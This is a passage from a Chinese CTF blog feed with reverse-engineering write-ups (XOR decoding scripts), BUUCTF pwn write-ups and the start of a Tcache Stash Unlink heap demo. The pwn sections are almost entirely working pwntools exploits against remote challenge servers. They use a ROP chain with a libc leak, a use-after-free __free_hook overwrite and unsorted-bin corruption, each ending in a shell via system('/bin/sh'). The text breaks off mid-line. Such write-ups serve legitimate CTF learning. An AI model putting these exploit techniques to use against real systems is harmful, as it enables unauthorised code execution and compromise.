class="headerlink" title="reverse"></a>reverse</h2><h3 id="MEGA-RACE"><a href="#MEGA-RACE" class="headerlink" title="MEGA-RACE"></a>MEGA-RACE</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> __fastcall <span class="title">scram</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">size_t</span> i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(flag);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    flag[i] ^= <span class="number">0x77</span>u;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单的异或，写个脚本简单解密即可</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> pass[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x11</span>, <span class="number">0x1B</span>, <span class="number">0x16</span>, <span class="number">0x10</span>, <span class="number">0x0C</span>, <span class="number">0x14</span>, <span class="number">0x47</span>, <span class="number">0x19</span>, <span class="number">0x10</span>, <span class="number">0x05</span>, </span><br><span class="line">  <span class="number">0x43</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x1B</span>, <span class="number">0x43</span>, <span class="number">0x03</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x19</span>, <span class="number">0x0D</span>, </span><br><span class="line">  <span class="number">0x28</span>, <span class="number">0x0E</span>, <span class="number">0x47</span>, <span class="number">0x02</span>, <span class="number">0x28</span>, <span class="number">0x16</span>, <span class="number">0x05</span>, <span class="number">0x44</span>, <span class="number">0x28</span>, <span class="number">0x03</span>, </span><br><span class="line">  <span class="number">0x1F</span>, <span class="number">0x44</span>, <span class="number">0x28</span>, <span class="number">0x30</span>, <span class="number">0x22</span>, <span class="number">0x2E</span>, <span class="number">0x56</span>, <span class="number">0x0A</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="built_in">strlen</span>(pass);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        pass[i] = pass[i] ^ <span class="number">0x77</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(pass);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="easy-py"><a href="#easy-py" class="headerlink" title="easy_py"></a>easy_py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># while None:</span></span><br><span class="line"><span class="comment">#     Happy = [</span></span><br><span class="line"><span class="comment">#         39,</span></span><br><span class="line"><span class="comment">#         109,</span></span><br><span class="line"><span class="comment">#         8,</span></span><br><span class="line"><span class="comment">#         109,</span></span><br><span class="line"><span class="comment">#         51,</span></span><br><span class="line"><span class="comment">#         70,</span></span><br><span class="line"><span class="comment">#         21,</span></span><br><span class="line"><span class="comment">#         65,</span></span><br><span class="line"><span class="comment">#         11,</span></span><br><span class="line"><span class="comment">#         112,</span></span><br><span class="line"><span class="comment">#         22,</span></span><br><span class="line"><span class="comment">#         111,</span></span><br><span class="line"><span class="comment">#         33,</span></span><br><span class="line"><span class="comment">#         82,</span></span><br><span class="line"><span class="comment">#         93,</span></span><br><span class="line"><span class="comment">#         124,</span></span><br><span class="line"><span class="comment">#         23,</span></span><br><span class="line"><span class="comment">#         72,</span></span><br><span class="line"><span class="comment">#         77,</span></span><br><span class="line"><span class="comment">#         125,</span></span><br><span class="line"><span class="comment">#         115,</span></span><br><span class="line"><span class="comment">#         74,</span></span><br><span class="line"><span class="comment">#         27,</span></span><br><span class="line"><span class="comment">#         98,</span></span><br><span class="line"><span class="comment">#         23,</span></span><br><span class="line"><span class="comment">#         87,</span></span><br><span class="line"><span class="comment">#         0,</span></span><br><span class="line"><span class="comment">#         95,</span></span><br><span class="line"><span class="comment">#         18,</span></span><br><span class="line"><span class="comment">#         115,</span></span><br><span class="line"><span class="comment">#         117,</span></span><br><span class="line"><span class="comment">#         42,</span></span><br><span class="line"><span class="comment">#         122,</span></span><br><span class="line"><span class="comment">#         18,</span></span><br><span class="line"><span class="comment">#         18,</span></span><br><span class="line"><span class="comment">#         124,</span></span><br><span class="line"><span class="comment">#         103,</span></span><br><span class="line"><span class="comment">#         88]</span></span><br><span class="line"><span class="comment">#     num = 37</span></span><br><span class="line"><span class="comment">#     f = input(&#x27;Please input your flag:&#x27;)</span></span><br><span class="line"><span class="comment">#     if len(f) != 38:</span></span><br><span class="line"><span class="comment">#         print(&#x27;Your input is illegal&#x27;)</span></span><br><span class="line"><span class="comment">#         continue</span></span><br><span class="line"><span class="comment">#     flag = list(f)</span></span><br><span class="line"><span class="comment">#     j = 0</span></span><br><span class="line"><span class="comment">#     for i in flag:</span></span><br><span class="line"><span class="comment">#         flag[j] = ord(i)</span></span><br><span class="line"><span class="comment">#         j += 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     t1 = threading.Thread(encode_1, (1,), **(&#x27;target&#x27;, &#x27;args&#x27;))</span></span><br><span class="line"><span class="comment">#     t2 = threading.Thread(encode_2, (2,), **(&#x27;target&#x27;, &#x27;args&#x27;))</span></span><br><span class="line"><span class="comment">#     t1.start()</span></span><br><span class="line"><span class="comment">#     time.sleep(0.5)</span></span><br><span class="line"><span class="comment">#     t2.start()</span></span><br><span class="line"><span class="comment">#     t1.join()</span></span><br><span class="line"><span class="comment">#     t2.join()</span></span><br><span class="line"><span class="comment">#     if flag == Happy:</span></span><br><span class="line"><span class="comment">#         print(&#x27;Good job!&#x27;)</span></span><br><span class="line"><span class="comment">#         continue</span></span><br><span class="line"><span class="comment">#     print(&#x27;No no no!&#x27;)</span></span><br></pre></td></tr></table></figure><p>是个多线程，encode函数是简单的异或</p><p>简单写个解密脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>():</span></span><br><span class="line">    flag = [</span><br><span class="line">        <span class="number">39</span>,</span><br><span class="line">        <span class="number">109</span>,</span><br><span class="line">        <span class="number">8</span>,</span><br><span class="line">        <span class="number">109</span>,</span><br><span class="line">        <span class="number">51</span>,</span><br><span class="line">        <span class="number">70</span>,</span><br><span class="line">        <span class="number">21</span>,</span><br><span class="line">        <span class="number">65</span>,</span><br><span class="line">        <span class="number">11</span>,</span><br><span class="line">        <span class="number">112</span>,</span><br><span class="line">        <span class="number">22</span>,</span><br><span class="line">        <span class="number">111</span>,</span><br><span class="line">        <span class="number">33</span>,</span><br><span class="line">        <span class="number">82</span>,</span><br><span class="line">        <span class="number">93</span>,</span><br><span class="line">        <span class="number">124</span>,</span><br><span class="line">        <span class="number">23</span>,</span><br><span class="line">        <span class="number">72</span>,</span><br><span class="line">        <span class="number">77</span>,</span><br><span class="line">        <span class="number">125</span>,</span><br><span class="line">        <span class="number">115</span>,</span><br><span class="line">        <span class="number">74</span>,</span><br><span class="line">        <span class="number">27</span>,</span><br><span class="line">        <span class="number">98</span>,</span><br><span class="line">        <span class="number">23</span>,</span><br><span class="line">        <span class="number">87</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">95</span>,</span><br><span class="line">        <span class="number">18</span>,</span><br><span class="line">        <span class="number">115</span>,</span><br><span class="line">        <span class="number">117</span>,</span><br><span class="line">        <span class="number">42</span>,</span><br><span class="line">        <span class="number">122</span>,</span><br><span class="line">        <span class="number">18</span>,</span><br><span class="line">        <span class="number">18</span>,</span><br><span class="line">        <span class="number">124</span>,</span><br><span class="line">        <span class="number">103</span>,</span><br><span class="line">        <span class="number">88</span>]</span><br><span class="line"></span><br><span class="line">    templist = [<span class="number">0</span>] * <span class="number">38</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">37</span>, <span class="number">0</span>, -<span class="number">2</span>):</span><br><span class="line">        templist[i] = flag[i] ^ i</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>, <span class="number">0</span>, -<span class="number">2</span>):</span><br><span class="line">        templist[i] = flag[i] ^ flag[i + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># flag = templist</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">        templist[i] = <span class="built_in">chr</span>(templist[i])</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;&quot;</span>.join(templist))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-pwn系列2</title>
      <link href="2021/05/11/pwn2/"/>
      <url>2021/05/11/pwn2/</url>
      
        <content type="html"><![CDATA[<h3 id="rootersctf-2019-babypwn"><a href="#rootersctf-2019-babypwn" class="headerlink" title="rootersctf_2019_babypwn"></a>rootersctf_2019_babypwn</h3><ul><li>考点：栈溢出，ropgadget，leak libc，ubuntu18字节对齐</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./rootersctf_2019_babypwn&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;libc-2.27.so&#x27;</span></span><br><span class="line">port = <span class="number">29701</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(binary)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401223</span></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;What do you want me to echo back&gt; &quot;</span>)</span><br><span class="line">payload = <span class="number">0x100</span> * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(<span class="number">0x401146</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">libc_addr = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;LIBC BASE:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_addr)))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">bss_base = <span class="number">0x404040</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sh = libc_addr + libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line">payload = <span class="number">0x108</span> * <span class="string">b&#x27;a&#x27;</span> + p64(ret) + p64(pop_rdi_ret) + p64(sh) + p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="xm-2019-awd-pwn2"><a href="#xm-2019-awd-pwn2" class="headerlink" title="xm_2019_awd_pwn2"></a>xm_2019_awd_pwn2</h3><ul><li>考点：uaf</li></ul><p>简单的uaf</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./xm_2019_awd_pwn2&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;../libc-2.27.so&#x27;</span></span><br><span class="line">port = <span class="number">27761</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, port)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, name</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:&#x27;</span>, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">s, addr</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;\033[1;31;40m%20s--&gt;0x%x\033[0m&#x27;</span> % (s, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">&#x27;b\n&#x27;</span>)    <span class="comment"># 8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_addr = u64(p.recvuntil(</span><br><span class="line">    <span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">96</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">echo(<span class="string">&quot;libc&quot;</span>, libc_addr)</span><br><span class="line">__free_hook = libc_addr + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>, p64(__free_hook) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">&#x27;/bin/sh\x00\n&#x27;</span>)    <span class="comment"># 8</span></span><br><span class="line">add(<span class="number">0x10</span>, p64(libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="gyctf-2020-document"><a href="#gyctf-2020-document" class="headerlink" title="gyctf_2020_document"></a>gyctf_2020_document</h3><ul><li>考点：<ul><li>uaf</li><li>unsorted bin</li></ul></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./gyctf_2020_document&quot;</span></span><br><span class="line"><span class="comment"># libc_path = &#x27;/glibc/2.23/64/lib/libc-2.23.so&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;../libc-2.23.so&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(<span class="string">&quot;aaaaaaaa&quot;</span>, <span class="string">&quot;W&quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x70</span>)</span><br><span class="line">    add(<span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="string">&quot;W&quot;</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span> * (<span class="number">0x70</span> // <span class="number">0x8</span>))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    libc_base = uu64(ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:]) - <span class="number">88</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">    echo(<span class="string">&quot;libc base:    &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    add(<span class="string">&quot;aaaaaaaa&quot;</span>, <span class="string">&quot;W&quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x70</span>)   <span class="comment"># 2</span></span><br><span class="line">    add(<span class="string">&quot;aaaaaaaa&quot;</span>, <span class="string">&quot;W&quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x70</span>)   <span class="comment"># 3</span></span><br><span class="line">    __free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(__free_hook - <span class="number">0x10</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x70</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">&quot;Y&quot;</span>, payload)</span><br><span class="line">    edit(<span class="number">3</span>, <span class="string">&quot;N&quot;</span>, p64(libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]).ljust(<span class="number">0x70</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="comment"># gdba()</span></span><br><span class="line">    <span class="comment"># pass</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25965</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">_add,_free,_edit,_show = <span class="number">1</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name, sex, content</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Give me your choice :&quot;</span>, <span class="built_in">str</span>(_add))</span><br><span class="line">    sa(<span class="string">&quot;input name&quot;</span>, name)</span><br><span class="line">    sa(<span class="string">&quot;input sex&quot;</span>, sex)</span><br><span class="line">    sa(<span class="string">&quot;input information&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, flag, content</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Give me your choice :&quot;</span>, <span class="built_in">str</span>(_edit))</span><br><span class="line">    sla(<span class="string">&quot;Give me your index :&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Are you sure change sex?&quot;</span>, flag)</span><br><span class="line">    sa(<span class="string">&quot;Now change information&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Give me your choice :&quot;</span>, <span class="built_in">str</span>(_free))</span><br><span class="line">    sla(<span class="string">&quot;Give me your index :&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Give me your choice :&quot;</span>, <span class="built_in">str</span>(_show))</span><br><span class="line">    sla(<span class="string">&quot;Give me your index :&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set $base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tcache Stash Unlink Demo 演示</title>
      <link href="2021/05/11/Tcache-Stash-Unlink-demo/"/>
      <url>2021/05/11/Tcache-Stash-Unlink-demo/</url>
      
        <content type="html"><![CDATA[<h3 id="实例源码演示"><a href="#实例源码演示" class="headerlink" title="实例源码演示"></a>实例源码演示</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> target = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *p;</span><br><span class="line"><span class="keyword">char</span> *smallchunk1;</span><br><span class="line"><span class="keyword">char</span> *smallchunk2;</span><br><span class="line"></span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;使用此攻击手法您可以实现向任意地址写入一个大数\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;目标:%p,值:0x%lx\n\n\n&quot;</span>,&amp;target,target);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1.首先申请六块0x60大小的chunk，然后全部free掉使之进入tcahce bin中\n\n\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">p = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x60</span>);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;六块进入tcache的chunk地址为%p,%p,%p,%p,%p,%p\n\n\n&quot;</span>,p - (<span class="number">0x70</span> * <span class="number">5</span>), p - (<span class="number">0x70</span> * <span class="number">4</span>),p - (<span class="number">0x70</span> * <span class="number">3</span>),p - (<span class="number">0x70</span> * <span class="number">2</span>),p - (<span class="number">0x70</span> * 